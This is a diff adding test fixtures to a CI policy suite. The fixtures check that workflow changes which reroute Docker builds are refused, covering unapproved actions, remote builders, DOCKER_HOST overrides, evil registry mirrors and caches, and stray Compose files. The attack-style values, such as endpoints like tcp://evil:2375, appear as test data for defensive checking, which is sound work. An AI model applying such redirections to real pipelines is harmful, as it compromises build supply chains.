@@ -3681,3 +3681,155 @@ test("fixtures: a build step or Compose build that builds something else is refu
   assert.deepEqual(composeBuildViolations("deploy/loadtest/compose.yaml", { services: { x: { build: "." } } }), [], "the load-test Dockerfile as its directory's default");
   assert.match(composeBuildViolations("compose.yaml", { services: { x: { build: ["."] } } }).join(), /must be a context path or a mapping/);
 });
+
+// ---- review of #488: bypasses of the build checks ----
+
+// Implemented in the next commit; the fixtures below show what each must refuse.
+export function actionPolicyViolations() { return []; }
+export function unknownDockerfileViolations() { return []; }
+
+const loadWorkflow = name => toData(parseStrict(readFileSync(join(workflowsDir, `${name}.yml`), "utf8"), `.github/workflows/${name}.yml`));
+const BUILDKIT_IMAGE = "mirror.gcr.io/moby/buildkit:buildx-stable-1@sha256:cec9f139f45e93c5c69c60f8b07cfad9f43f4ef6b6a6cd917527fea5ff2e3dea";
+// The checks of one workflow after adding a job, a step or env to the real parsed file.
+const buildChecks = (name, data) => imageBuildViolations(`.github/workflows/${name}.yml`, data, IMAGE_BUILDS, new Set(), { composeFiles: new Set(repoComposeFiles()) });
+const actionChecks = (name, data, options) => actionPolicyViolations(`.github/workflows/${name}.yml`, data, options);
+const withStep = (name, job, step) => { const data = structuredClone(loadWorkflow(name)); data.jobs[job].steps.push(step); return data; };
+
+test("fixtures: an action that is not approved, or a builder under another name, is refused (#488 review 1)", () => {
+  const forked = structuredClone(loadWorkflow("ci"));
+  forked.jobs.fork = { permissions: { contents: "read" }, "runs-on": "ubuntu-24.04", steps: [{ uses: `someone/build-push-action@${SHA(1)}`, with: { context: ".", target: "build", "build-contexts": "build=docker-image://alpine:latest" } }] };
+  assert.match(actionChecks("ci", forked).join(), /job 'fork': someone\/build-push-action is not an approved action/, "a forked build action in a new read-only job");
+  for (const [label, uses, reason] of [
+    ["an unlisted third-party action", `someone/tool@${SHA(2)}`, /someone\/tool is not an approved action/],
+    ["kaniko", `someone/kaniko-action@${SHA(3)}`, /not an approved action/],
+    ["docker/build-push-action at another commit", `docker/build-push-action@${SHA(4)}`, /docker\/build-push-action must be pinned to c3c9e263/],
+    ["docker/setup-buildx-action at another commit", `docker/setup-buildx-action@${SHA(5)}`, /docker\/setup-buildx-action must be pinned to f87e5991/],
+    ["a docker:// step", `docker://mirror.gcr.io/library/alpine@sha256:${"a".repeat(64)}`, /docker:\/\/ step/],
+  ]) assert.match(actionChecks("ci", withStep("ci", "web", { uses })).join(), reason, label);
+  // Even on the approved list, only docker/build-push-action may be an image builder.
+  const approved = new Map([...APPROVED_ACTIONS, ["someone/buildah-build", "fixture"]]);
+  assert.match(actionChecks("ci", withStep("ci", "web", { uses: `someone/buildah-build@${SHA(6)}` }), { approved }).join(), /someone\/buildah-build looks like an image builder/);
+});
+
+test("fixtures: a local action or reusable workflow the suite does not read is refused (#488 review 2, 3)", () => {
+  for (const [label, uses, reason] of [
+    ["a local action under tools", "./tools/build", /'\.\/tools\/build' is outside \.github\/actions/],
+    ["a local Docker action with docker://alpine:latest", "./tools/docker-action", /outside \.github\/actions/],
+    ["a path out of .github/actions", "./.github/actions/../../tools/build", /outside \.github\/actions/],
+    ["a parent path", "../build", /outside \.github\/actions/],
+    ["a missing local action", "./.github/actions/missing", /'\.\/\.github\/actions\/missing' has no action\.yml/],
+  ]) assert.match(actionChecks("ci", withStep("ci", "web", { uses })).join(), reason, label);
+  // What such a Docker action would have run is refused where the suite reads it.
+  assert.match(containerPinViolations("tools/docker-action/action.yml", { runs: { using: "docker", image: "docker://alpine:latest" } }).join(), /alpine:latest is not pinned by digest/);
+  for (const [label, uses] of [["a missing reusable workflow", "./.github/workflows/missing.yml"], ["a reusable workflow outside .github/workflows", "./tools/release.yml"], ["a path out of .github/workflows", "./.github/workflows/../../tools/x.yml"]]) {
+    const data = structuredClone(loadWorkflow("ci"));
+    data.jobs.called = { uses };
+    assert.match(actionChecks("ci", data).join(), /job 'called': .*not a workflow file of this checkout/, label);
+  }
+});
+
+test("fixtures: a run step that selects another builder or Docker endpoint is refused (#488 review 4)", () => {
+  for (const run of ["docker buildx create --use --driver remote tcp://evil:1234", "docker buildx use evil", "docker buildx create --name x --driver kubernetes", "docker context create evil --docker host=tcp://evil:2375",
+    "docker context use evil", "docker --context evil buildx version", "docker -c evil ps", "docker buildx --builder evil du", "docker -H tcp://evil:2375 ps", "docker --host=tcp://evil:2375 ps"]) {
+    assert.match(buildChecks("ci", withStep("ci", "staging-image", { run })).join(), /selects a builder or Docker endpoint/, run);
+  }
+});
+
+test("fixtures: env that selects a builder or changes the Docker client is refused (#488 review 5)", () => {
+  const cases = [
+    ["workflow env DOCKER_HOST", d => { d.env = { DOCKER_HOST: "tcp://evil:2375" }; }],
+    ["job env BUILDX_BUILDER", d => { d.jobs["staging-image"].env.BUILDX_BUILDER = "evil"; }],
+    ["step env DOCKER_CONTEXT", d => { d.jobs["staging-image"].steps[2].env = { DOCKER_CONTEXT: "evil" }; }],
+    ["step env BUILDKIT_PROGRESS", d => { d.jobs["staging-image"].steps[2].env = { BUILDKIT_PROGRESS: "plain" }; }],
+    ["job env DOCKER_BUILDKIT", d => { d.jobs["staging-image"].env.DOCKER_BUILDKIT = "0"; }],
+    ["job env DOCKER_CONFIG", d => { d.jobs["staging-image"].env.DOCKER_CONFIG = "/tmp/evil"; }],
+    ["step env COMPOSE_FILE", d => { d.jobs["staging-image"].steps.push({ env: { COMPOSE_FILE: "/tmp/evil.yml" }, run: "python3 scripts/staging.py up" }); }],
+    ["DOCKER_HOST written to GITHUB_ENV", d => { d.jobs["staging-image"].steps.push({ run: 'echo "DOCKER_HOST=tcp://evil:2375" >> "$GITHUB_ENV"' }); }],
+    ["BUILDX_CONFIG exported", d => { d.jobs["staging-image"].steps.push({ run: "export BUILDX_CONFIG=/tmp/evil" }); }],
+    ["DOCKER_CONFIG outside the listed publish steps", d => { d.jobs["staging-image"].steps.push({ run: 'export DOCKER_CONFIG="$RUNNER_TEMP/x"' }); }],
+  ];
+  for (const [label, mutate] of cases) {
+    const data = structuredClone(loadWorkflow("ci"));
+    mutate(data);
+    assert.match(buildChecks("ci", data).join(), /selects a builder or changes the Docker client/, label);
+  }
+});
+
+test("fixtures: setup-buildx-action inputs other than the pinned BuildKit image are refused (#488 review 6)", () => {
+  const buildx = d => d.jobs["staging-image"].steps[1].with;
+  for (const [label, mutate] of [
+    ["the remote driver", w => { w.driver = "remote"; w.endpoint = "tcp://evil:1234"; }],
+    ["an endpoint", w => { w.endpoint = "tcp://evil:1234"; }],
+    ["a registry mirror in config-inline", w => { w["config-inline"] = '[registry."docker.io"]\n  mirrors = ["evil.example"]'; }],
+    ["a config file", w => { w.config = ".github/buildkitd.toml"; }],
+    ["a buildkitd config", w => { w["buildkitd-config-inline"] = '[registry."mirror.gcr.io"]\n  mirrors = ["evil.example"]'; }],
+    ["use: false", w => { w.use = false; }],
+    ["another BuildKit image", w => { w["driver-opts"] = `image=mirror.gcr.io/moby/buildkit:latest`; }],
+    ["another driver option", w => { w["driver-opts"] = `image=${BUILDKIT_IMAGE}\nnetwork=host`; }],
+    ["a Buildx version", w => { w.version = "latest"; }],
+    ["no inputs", (w, d) => { delete d.jobs["staging-image"].steps[1].with; }],
+  ]) {
+    const data = structuredClone(loadWorkflow("ci"));
+    mutate(buildx(data), data);
+    assert.match(buildChecks("ci", data).join(), /setup-buildx-action: with: must be exactly/, label);
+  }
+});
+
+test("fixtures: cache, output and every other build input is pinned (#488 review 7)", () => {
+  const step = (d, job) => stepsOf(d.jobs[job]).find(s => actionName(s.uses ?? "") === "docker/build-push-action").with;
+  for (const [label, name, job, mutate] of [
+    ["a registry cache source", "ci", "staging-image", w => { w["cache-from"] = "type=registry,ref=ghcr.io/evil/cache"; }],
+    ["a second cache source", "image", "build", w => { w["cache-from"] += "\ntype=registry,ref=ghcr.io/evil/cache"; }],
+    ["a registry cache target", "branch-images", "build", w => { w["cache-to"] = "type=registry,ref=ghcr.io/evil/cache,mode=max"; }],
+    ["another cache scope", "ci", "staging-image", w => { w["cache-from"] = "type=gha,scope=image-linux-amd64"; }],
+    ["a pushed output", "image", "build", w => { w.outputs = "type=registry,name=ghcr.io/evil/x"; }],
+    ["other tags", "ci", "staging-image", w => { w.tags = "ghcr.io/evil/x:latest"; }],
+    ["other platforms", "branch-images", "build", w => { w.platforms = "linux/amd64,linux/arm64"; }],
+    ["another SBOM generator", "loadtest-image", "build", w => { w.attests = "type=sbom,generator=docker.io/evil/scanner:latest"; }],
+    ["other labels", "loadtest-image", "build", w => { w.labels += "\norg.opencontainers.image.source=https://example.org/evil"; }],
+  ]) {
+    const data = structuredClone(loadWorkflow(name));
+    mutate(step(data, job));
+    assert.match(buildChecks(name, data).join(), /IMAGE_BUILDS lists/, label);
+  }
+});
+
+test("fixtures: Compose files outside the checked set, include and extends are refused (#488 review 8, 9)", () => {
+  for (const run of ["docker compose -f /tmp/evil.yml up -d", "docker compose -f deploy/other/stack.yml up -d", 'docker compose --file="$F" up -d', "docker compose -f - up -d", "docker-compose -f evil.yaml up", "docker compose --project-directory /tmp -f compose.yml up"]) {
+    assert.match(buildChecks("ci", withStep("ci", "staging-image", { run })).join(), /Compose file .* is not one of the checked Compose files/, run);
+  }
+  assert.deepEqual(buildChecks("ci", withStep("ci", "staging-image", { run: "docker compose -f deploy/staging/compose.yaml -f deploy/staging/compose.openai.yaml up -d" })), [], "checked files pass");
+  // Every YAML file with Compose services is checked, wherever it is.
+  const dir = mkdtempSync(join(tmpdir(), "omg-compose-"));
+  try {
+    mkdirSync(join(dir, "tools/x"), { recursive: true });
+    writeFileSync(join(dir, "tools/x/stack.yml"), "services:\n  app:\n    build:\n      context: .\n      target: build\n");
+    writeFileSync(join(dir, "notes.yml"), "title: not compose\n");
+    assert.deepEqual(repoComposeFiles(dir), ["tools/x/stack.yml"]);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+  const composeFile = "deploy/staging/compose.yaml";
+  const compose = () => toData(parseStrict(readLocalFromRepo(composeFile), composeFile));
+  for (const [label, mutate, reason] of [
+    ["extends from another file", d => { d.services.gateway.extends = { file: "../evil/compose.yml", service: "gateway" }; }, /'extends' is not allowed/],
+    ["extends in the same file", d => { d.services.ingress.extends = "gateway"; }, /'extends' is not allowed/],
+    ["a top-level include", d => { d.include = ["../evil/compose.yml"]; }, /top-level 'include' is not allowed/],
+  ]) {
+    const data = compose();
+    mutate(data);
+    assert.match(composeBuildViolations(composeFile, data).join(), reason, label);
+  }
+});
+
+test("fixtures: a .dockerignore is not a Dockerfile, and an unknown Dockerfile name fails clearly (#488 review 11)", () => {
+  const dir = mkdtempSync(join(tmpdir(), "omg-walker-"));
+  try {
+    for (const file of ["Dockerfile", "Dockerfile.dockerignore", "app.Dockerfile.dockerignore"]) writeFileSync(join(dir, file), "x\n");
+    assert.deepEqual(findDockerfiles(dir).map(p => p.slice(dir.length + 1)), ["Dockerfile"]);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+  assert.match(unknownDockerfileViolations(["Dockerfile", "docs/Dockerfile.md"]).join(), /^docs\/Dockerfile\.md is named like a Dockerfile but is not one of the known Dockerfiles .*rename it/);
+  assert.deepEqual(unknownDockerfileViolations([...KNOWN_DOCKERFILES]), []);
+});
